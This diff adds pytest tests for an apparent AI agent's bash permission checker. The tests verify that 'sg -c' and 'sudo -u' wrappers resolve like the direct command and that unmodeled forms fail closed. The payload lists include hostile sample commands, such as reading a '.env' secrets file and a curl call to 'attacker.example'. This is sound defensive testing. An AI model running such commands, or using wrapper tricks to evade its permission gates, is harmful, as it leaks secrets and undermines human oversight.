@@ -588,3 +588,196 @@ def test_package_destinations_are_consistently_scoped(
     assert context.permission == (
         ToolPermission.ALWAYS if destination == "local" else ToolPermission.NEVER
     )
+
+
+# sg: group wrapper whose -c payload is shell source (v0.5.9 P1-e1).
+# The -c payload is re-analyzed through the wrapper, so every payload
+# class matches the same payload spelled directly; every other sg form is
+# unmodeled and fails closed.
+
+_SG_PAYLOADS = [
+    "git status",
+    "echo hi",
+    "git reset --hard",
+    "git push",
+    "rm -rf /tmp/sg-probe-x",
+    "cat ~/.chartreux/.env",
+    "curl http://attacker.example/",
+]
+
+
+@pytest.mark.parametrize("payload", _SG_PAYLOADS)
+def test_sg_c_payload_resolves_like_the_direct_command(bash_tool, payload):
+    """The -c payload class must match the directly spelled payload."""
+    wrapped = bash_tool.resolve_permission(
+        BashArgs(command=f"sg docker -c '{payload}'")
+    )
+    direct = bash_tool.resolve_permission(BashArgs(command=payload))
+    assert wrapped is not None and direct is not None, payload
+    assert wrapped.permission is direct.permission, (payload, wrapped, direct)
+    assert wrapped.denial_kind == direct.denial_kind, (payload, wrapped, direct)
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "sg docker bash -c 'git status'",
+        "sg docker git status",
+        "sg docker",
+        "sg",
+        "sg docker -c",
+        "sg docker -c'x'",
+        "sg --unknown docker -c 'x'",
+    ],
+)
+def test_sg_unmodeled_forms_fail_closed(bash_tool, command):
+    context = bash_tool.resolve_permission(BashArgs(command=command))
+    assert context is not None
+    assert context.permission is ToolPermission.NEVER, (command, context)
+
+
+def test_sg_boundary_is_shell_source_with_group_prefix() -> None:
+    boundary = executor_boundary(shlex.split("sg docker -c 'git status'"))
+    assert boundary is not None
+    assert boundary.boundary_kind == "shell_source"
+    assert boundary.consumed_ranges == ((0, 4),)
+    assert boundary.inline_payload_ranges == ((3, 4),)
+    assert boundary.inline_payloads == ("git status",)
+    with pytest.raises(ValueError, match="unsupported sg form"):
+        executor_boundary(shlex.split("sg docker bash -c 'x'"), admission=True)
+
+
+def test_sg_unquoted_payload_boundary_joins_the_source() -> None:
+    """v0.5.9 P3-b2: an unquoted multi-token -c payload joins the source.
+
+    The trailing tokens must ride in the shell source, never become
+    program arguments dismissed by the analysis.
+    """
+    boundary = executor_boundary(shlex.split("sg docker -c git push"))
+    assert boundary is not None
+    assert boundary.boundary_kind == "shell_source"
+    assert boundary.consumed_ranges == ((0, 5),)
+    assert boundary.inline_payload_ranges == ((3, 5),)
+    assert boundary.inline_payloads == ("git push",)
+    assert boundary.program_argument_range is None
+
+
+@pytest.mark.parametrize("payload", _SG_PAYLOADS)
+def test_sg_unquoted_multi_token_payload_resolves_like_the_quoted_form(
+    bash_tool, payload
+):
+    """v0.5.9 P3-b2: the unquoted spelling of a multi-token payload gets
+    the same class as its quoted form — no gated payload may degrade to
+    the bare first word and resolve run-class.
+    """
+    unquoted = bash_tool.resolve_permission(BashArgs(command=f"sg docker -c {payload}"))
+    quoted = bash_tool.resolve_permission(
+        BashArgs(command=f"sg docker -c {shlex.quote(payload)}")
+    )
+    assert unquoted is not None and quoted is not None, payload
+    assert unquoted.permission is quoted.permission, (payload, unquoted, quoted)
+    assert unquoted.denial_kind == quoted.denial_kind, (payload, unquoted, quoted)
+
+
+# sudo -u: transparent user wrapper (v0.5.9 P2-d). The wrapped command argv
+# is re-analyzed through the wrapper, so every command class matches the
+# same command spelled directly; every other sudo form is unmodeled and
+# fails closed.
+
+_SUDO_PAYLOADS = [
+    "git status",
+    "echo hi",
+    "git reset --hard",
+    "git push",
+    "rm -rf /tmp/sudo-probe-x",
+    "cat ~/.chartreux/.env",
+    "curl http://attacker.example/",
+]
+
+
+@pytest.mark.parametrize("payload", _SUDO_PAYLOADS)
+def test_sudo_u_command_resolves_like_the_direct_command(bash_tool, payload):
+    """The wrapped command class must match the directly spelled command."""
+    wrapped = bash_tool.resolve_permission(
+        BashArgs(command=f"sudo -u nobody {payload}")
+    )
+    direct = bash_tool.resolve_permission(BashArgs(command=payload))
+    assert wrapped is not None and direct is not None, payload
+    assert wrapped.permission is direct.permission, (payload, wrapped, direct)
+    assert wrapped.denial_kind == direct.denial_kind, (payload, wrapped, direct)
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        # v0.5.9 P2-d: the modeled -u/--user spellings all re-analyze the
+        # wrapped command; nested wrappers and shell payloads compose.
+        "sudo -u nobody bash -c 'git status'",
+        "sudo -u nobody nice git status",
+        "sudo --user nobody git status",
+        "sudo --user=nobody git status",
+        "sudo -unobody git status",
+        "sudo -u nobody -- git status",
+        "sudo -u a -u b git status",
+    ],
+)
+def test_sudo_u_spelling_variants_resolve_like_the_direct_command(bash_tool, command):
+    """Every modeled -u/--user spelling re-analyzes the wrapped command."""
+    wrapped = bash_tool.resolve_permission(BashArgs(command=command))
+    direct = bash_tool.resolve_permission(BashArgs(command="git status"))
+    assert wrapped is not None and direct is not None, command
+    assert wrapped.permission is direct.permission, (command, wrapped, direct)
+    assert wrapped.denial_kind == direct.denial_kind, (command, wrapped, direct)
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "sudo ls",
+        "sudo true",
+        "sudo",
+        "sudo git status",
+        "sudo -- git status",
+        "sudo -u nobody",
+        "sudo -u",
+        "sudo -i",
+        "sudo -s",
+        "sudo -u nobody -E git status",
+        "sudo --unknown -u nobody git status",
+        "sudo -u nobody - git status",
+    ],
+)
+def test_sudo_unmodeled_forms_fail_closed(bash_tool, command):
+    context = bash_tool.resolve_permission(BashArgs(command=command))
+    assert context is not None
+    assert context.permission is ToolPermission.NEVER, (command, context)
+
+
+def test_sudo_boundary_is_argv_positional_with_user_prefix() -> None:
+    boundary = executor_boundary(shlex.split("sudo -u nobody git status"))
+    assert boundary is not None
+    assert boundary.boundary_kind == "argv_positional"
+    assert boundary.inner_command_range == (3, 5)
+    assert boundary.consumed_ranges == ((0, 3),)
+    assert boundary.inline_payload_ranges == ()
+    with pytest.raises(ValueError, match="unsupported sudo form"):
+        executor_boundary(shlex.split("sudo ls"), admission=True)
+    with pytest.raises(ValueError, match="unsupported sudo form"):
+        executor_boundary(shlex.split("sudo -u nobody"), admission=True)
+    with pytest.raises(ValueError, match="unknown or ambiguous executor option"):
+        executor_boundary(shlex.split("sudo -i"), admission=True)
+
+
+def test_sudo_u_quoted_multi_word_payload_matches_the_direct_token(bash_tool):
+    """A quoted multi-word sudo payload is ONE argv token: sudo would exec
+    a file by that literal name, so its class must match the same single
+    token spelled directly (the unknown-executable run-class), never the
+    git.push ask-class a shell would give the words (v0.5.9 P3-b2 probe).
+    """
+    wrapped = bash_tool.resolve_permission(
+        BashArgs(command='sudo -u nobody "git push"')
+    )
+    direct = bash_tool.resolve_permission(BashArgs(command='"git push"'))
+    assert wrapped is not None and direct is not None
+    assert wrapped.permission is direct.permission, (wrapped, direct)
+    assert wrapped.denial_kind == direct.denial_kind, (wrapped, direct)
